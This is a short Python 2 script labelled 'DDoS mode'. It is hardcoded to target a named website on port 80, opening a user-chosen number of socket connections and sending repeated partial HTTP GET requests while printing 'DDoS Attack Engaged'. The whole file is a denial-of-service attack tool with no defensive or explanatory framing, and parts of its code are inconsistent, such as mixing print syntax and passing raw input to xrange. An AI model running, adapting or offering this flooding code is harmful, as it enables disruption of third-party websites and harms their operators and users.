import time, socket, os, sys, string
 
print ("DDoS mode loaded")
host='daystograduation.com'
port=80
message="trying"
conn=input( "How many connections you want to make:" )
ip = socket.gethostbyname( host )
print ip
 
def dos():
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
        ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
        ddos.send( "GET /%s HTTP/1.1\r\n" % message )
    except socket.error, msg:
        print("|[Connection Failed]         |")
    print ( "|[DDoS Attack Engaged]       |")
    ddos.close()
 
for i in xrange(conn):
    dos()